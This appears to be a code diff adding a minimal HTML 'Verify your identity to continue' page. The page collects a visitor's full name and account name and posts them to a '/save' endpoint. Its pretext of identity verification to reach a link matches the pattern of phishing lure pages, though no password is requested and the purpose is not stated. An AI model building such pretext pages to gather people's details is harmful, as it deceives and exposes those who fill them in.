@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Verify</title>
+
+<style>
+
+body{
+  background:black;
+  color:white;
+  font-family:Arial;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.container{
+  width:400px;
+  text-align:center;
+}
+
+input{
+  width:100%;
+  height:55px;
+  margin-bottom:15px;
+  background:#1b1b1b;
+  border:none;
+  border-radius:12px;
+  padding:0 15px;
+  color:white;
+}
+
+button{
+  width:100%;
+  height:55px;
+  border:none;
+  border-radius:12px;
+  cursor:pointer;
+}
+
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h1>Verify your identity to continue</h1>
+
+<p style="color:#777">
+You need to verify your identity to access this link.
+</p>
+
+<input type="text" id="fullname" placeholder="First name and last name">
+
+<input type="text" id="account" placeholder="Account name">
+
+<button onclick="sendData()">Continue</button>
+
+</div>
+
+<script>
+
+async function sendData(){
+
+  const fullname = document.getElementById("fullname").value;
+  const account = document.getElementById("account").value;
+
+  await fetch("/save",{
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+      fullname,
+      account
+    })
+  });
+
+  alert("Saved");
+
+}
+
+</script>
+
+</body>
+</html>
